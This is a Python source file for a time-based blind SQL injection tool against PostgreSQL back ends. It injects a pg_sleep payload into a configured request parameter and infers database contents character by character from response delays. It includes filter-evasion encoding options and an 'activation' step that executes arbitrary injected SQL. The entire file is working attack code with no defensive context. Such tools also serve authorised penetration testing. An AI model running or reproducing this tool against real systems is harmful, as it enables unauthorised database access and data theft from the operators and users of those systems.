import copy
import json
import logging
import string
import time

import requests

_logger = logging.getLogger(__name__)

_CONFIG_SEARCH_CHARS = 'search_chars'
_CONFIG_DEFAULT_SEARCH_CHARS = string.printable

_CONFIG_BLACKLIST_CHARS = "blacklist_chars"
_CONFIG_LAST_RESORT_CHARS = "last_resort_chars"

_CONFIG_BASE_URL = "base_url"
_CONFIG_BASE_PARAMS = "base_params"
_CONFIG_HEADERS = "headers"

_CONFIG_INJECTED_PARAM_NAME = "injected_param_name"
_CONFIG_INJECTED_PARAM_VALID_VALUE = "injected_param_valid_value"

_CONFIG_SQL_PAYLOAD = "injected_sql_payload"
_CONFIG_SQL_PAYLOAD_DEFAULT = \
    '''
    ,(SELECT CASE WHEN COUNT((
    SELECT (
    SELECT CASE WHEN COUNT((
        SELECT (:INNER:)))
                <>0 THEN pg_sleep(:WAIT:) ELSE '' END)
            ))
        <>0 THEN true ELSE false END)
    '''

_CONFIG_SQL_SEARCH = 'sql_search'
_CONFIG_SQL_ACTIVATION = 'sql_activation'
_CONFIG_SQL_EXACT = 'sql_exact'

_CONFIG_EXPECTED_ERROR_CODE = "expected_error_code"
_CONFIG_DEFAULT_EXPECTED_ERROR_CODE = 200

_CONFIG_TIME_THRESHOLD = "time_threshold"
_CONFIG_BLACKLIST_PREFIX = "blacklist_prefix"

_CONFIG_SINGLE_VALUE_SEARCH = "single_value"
_CONFIG_DEFAULT_SINGLE_VALUE_SEARCH = False

_CONFIG_ESCAPE_VALUE = "escape_value"
_CONFIG_DEFAULT_ESCAPE_VALUE = False

_CONFIG_ENCODE_VALUE = "encode_value"
_CONFIG_DEFAULT_ENCODE_VALUE = False


def _read_configurations():
    with open('config.json') as file:
        return json.load(file)


def _call(config, injected_value, time_threshold=0):
    base_url = config[_CONFIG_BASE_URL]
    base_params = config.get(_CONFIG_BASE_PARAMS, {})
    headers = config.get(_CONFIG_HEADERS, None)
    injected_param = config[_CONFIG_INJECTED_PARAM_NAME]
    base_params = copy.copy(base_params)

    base_params[injected_param] = injected_value
    expected_error_code = config.get(_CONFIG_EXPECTED_ERROR_CODE, _CONFIG_DEFAULT_EXPECTED_ERROR_CODE)

    _logger.debug("Performing call URL={}, PARAM={}, HEADERS={}".format(base_url, base_params, headers))

    start = time.time()
    response = requests.get(base_url, params=base_params, headers=headers)
    end = time.time()

    time_took = end - start
    _logger.debug("Time took = {}".format(time_took))

    _logger.debug("Response({}): {}".format(response.status_code, response.text))

    valid_response = response.status_code == expected_error_code
    response.close()

    if not valid_response:
        _logger.warning(
            'Call failed value={}, code={}, text={}'.format(injected_value, response.status_code, response.text))

    if valid_response and time_threshold > 0:
        valid_response = time_took > time_threshold

    return valid_response


def _sanity_call(config):
    _logger.info("Performing sanity call")
    valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
    valid_response = _call(config, valid_value)
    if not valid_response:
        raise Exception("Sanity call failed")


def _call_with_value(config, search_value, is_exact, is_activation):
    valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
    time_threshold = config.get(_CONFIG_TIME_THRESHOLD, 0)

    escape_value = config.get(_CONFIG_ESCAPE_VALUE, _CONFIG_DEFAULT_ESCAPE_VALUE)
    encode_value = config.get(_CONFIG_ENCODE_VALUE, _CONFIG_DEFAULT_ENCODE_VALUE)

    if escape_value:
        search_value = '\'' + ''.join(['\\' + ch for ch in search_value]) + '\''

    elif encode_value:
        search_value = ' || '.join(
            ['\'\\\' || encode(\'\\x' + format(ord(ch), 'x') + '\',\'escape\')' for ch in search_value])

    else:
        search_value = '\'' + search_value + '\''

    sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)

    if is_exact:
        inner = config[_CONFIG_SQL_EXACT]
    elif is_activation:
        inner = config[_CONFIG_SQL_ACTIVATION]
    else:
        search_value = search_value + ' || \'%\''
        inner = config[_CONFIG_SQL_SEARCH]

    value = valid_value + sql_payload. \
        replace(':INNER:', inner). \
        replace(':WAIT:', str(time_threshold)). \
        replace(':VAL:', search_value)
    return _call(config, value, time_threshold=time_threshold)


def _extract_data(config):
    single_value = config.get(_CONFIG_SINGLE_VALUE_SEARCH, _CONFIG_DEFAULT_SINGLE_VALUE_SEARCH)
    detected_values = []
    blacklist_prefix = config.get(_CONFIG_BLACKLIST_PREFIX, None)

    search_chars = config.get(_CONFIG_SEARCH_CHARS, _CONFIG_DEFAULT_SEARCH_CHARS)
    blacklist_chars = config.get(_CONFIG_BLACKLIST_CHARS, None)

    if blacklist_chars is not None:
        search_chars = ''.join(ch for ch in search_chars if ch not in blacklist_chars)

    last_resort_chars = config.get(_CONFIG_LAST_RESORT_CHARS, None)
    if last_resort_chars is not None:
        search_chars = search_chars + last_resort_chars

    detected_prefixes = ['']
    logging.info("Starting search...")
    while len(detected_prefixes) > 0:
        prefix = detected_prefixes.pop()
        if blacklist_prefix is not None and not prefix.upper().startswith(blacklist_prefix.upper()):
            if not single_value and len(prefix) > 0:
                _logger.debug("Trying to see if {} is exact value".format(prefix))
                if _call_with_value(config, prefix, True, False):
                    _logger.debug("Detected value {}".format(prefix))
                    print('\r{}'.format(prefix), end='\n')
                    detected_values.append(prefix)

            found_next = False
            chars_len = len(search_chars)
            curr_ch_index = 0

            logging.getLogger().handlers[0].flush()
            while (not found_next) and curr_ch_index < chars_len:
                ch = search_chars[curr_ch_index]
                curr_ch_index = curr_ch_index + 1

                _logger.debug("Checking {}".format(prefix + ch))

                print('\r' + prefix + ch, end='')

                is_correct = _call_with_value(config, prefix + ch, False, False)

                # Double check
                if is_correct:
                    is_correct = _call_with_value(config, prefix + ch, False, False)

                if is_correct:
                    detected_prefixes.append(prefix + ch)

                    if single_value:
                        found_next = True
                    else:
                        _logger.debug("Detected valid prefix {}".format(prefix + ch))
            if not found_next and single_value:
                detected_values.append(prefix)

    return detected_values


if __name__ == '__main__':
    # noinspection PyBroadException
    try:
        logging.basicConfig(level=logging.INFO)
        _logger.info("Reading configurations")
        _config = _read_configurations()
        _logger.info("Configuration: {}".format(_config))
        _sanity_call(_config)
        if _CONFIG_SQL_ACTIVATION in _config:
            _logger.info("Running activation SQL")
            _call_with_value(_config, '', False, True)
        if _CONFIG_SQL_SEARCH in _config:
            data = _extract_data(_config)
            print()
            _logger.info("Detected values: {}".format(data))
        else:
            _logger.info("No search defined")
    except Exception:
        _logger.exception("Error")
